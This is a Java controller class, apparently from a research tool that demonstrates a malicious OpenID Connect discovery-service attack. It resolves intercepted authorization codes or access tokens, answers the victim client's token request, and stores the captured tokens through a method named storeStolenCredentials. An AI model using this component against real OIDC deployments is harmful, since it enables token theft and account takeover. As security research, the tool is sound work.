package de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.controller;

import com.nimbusds.oauth2.sdk.ResponseMode;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import com.nimbusds.oauth2.sdk.http.HTTPRequest;
import com.nimbusds.oauth2.sdk.http.HTTPResponse;
import com.nimbusds.oauth2.sdk.http.ServletUtils;
import com.nimbusds.openid.connect.sdk.AuthenticationSuccessResponse;
import com.nimbusds.openid.connect.sdk.OIDCAccessTokenResponse;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.exceptions.CodeFlowResolverException;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.utils.AccessTokenResolver;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.utils.CodeFlowResolver;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.utils.InterceptedData;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.utils.OAuthFlow;
import java.io.IOException;
import java.io.Serializable;
import javax.faces.bean.ManagedBean;

/**
 *
 * @author vladi
 */
@ManagedBean(name="attacker")
public class AttackController implements Serializable{

    private HttpServletRequest request;
    private HttpServletResponse response;
    private HTTPRequest httpRequest;
    private InterceptedData interceptedData;

    public AttackController(HttpServletRequest request, HttpServletResponse response, OAuthFlow flow) throws IOException, CodeFlowResolverException {
        this.request = request;
        this.response = response;
        httpRequest = ServletUtils.createHTTPRequest(request);

        if (flow == OAuthFlow.code) {
            interceptedData = CodeFlowResolver.resolve(httpRequest);    
            HTTPResponse httpResponse = CodeFlowResolver.getOIDCAccessTokenResponse(interceptedData);
            ServletUtils.applyHTTPResponse(httpResponse, response);
        } else {
            interceptedData = AccessTokenResolver.resolve(httpRequest);
        }
        
        storeStolenCredentials(interceptedData);
    }
    
    private void storeStolenCredentials(InterceptedData data) {
        ConfigurationManager.getCfgManager().getDatabase().addInterceptedToken(data);
    }

    public InterceptedData getInterceptedData() {
        return interceptedData;
    }

    public void setInterceptedData(InterceptedData interceptedData) {
        this.interceptedData = interceptedData;
    }
    
    
}
